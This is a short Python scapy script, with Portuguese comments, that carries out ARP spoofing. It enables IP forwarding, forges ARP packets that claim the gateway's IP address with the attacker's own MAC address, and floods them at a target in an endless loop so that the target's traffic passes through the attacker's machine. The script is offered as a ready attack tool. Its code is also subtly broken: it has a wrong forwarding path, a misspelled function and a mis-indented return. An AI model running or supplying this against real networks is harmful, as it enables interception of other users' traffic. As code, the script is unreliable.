from scapy.all import *

import sys
import os

#Ativando

os.system("echo 1 > \proc\sys\net\ipv4\ip_forward")

#Buscando o Endereço MAC

def get_mac_address():
    my_macs = [get_if_hwaddr(i) for i in get_if_lis()]
    for mac in my_macs:
        if(mac != "ff:ff:ff:ff:ff:ff"):
        return mac

Timeout = 2

#Determinando as Condições

if len(sys.argv) != 3:
   print("\nUse IP_ATTACK IP_GATEWAY em seguida IP_GATEWAY IP_ATTACK")
   sys.exit(1)

my_mac = get_mac_address()
if not my_mac:
   print("Não é possível obter o MAC")
   sys.exit(1)

#Formando o Pacote

packet = Ether()/ARP(op="who-has", hwsrc=my_mac, psrc=sys.argv[2], pdst=sys.argv[1])

#Enviando os Pacotes

while(True):
    srp(packet)
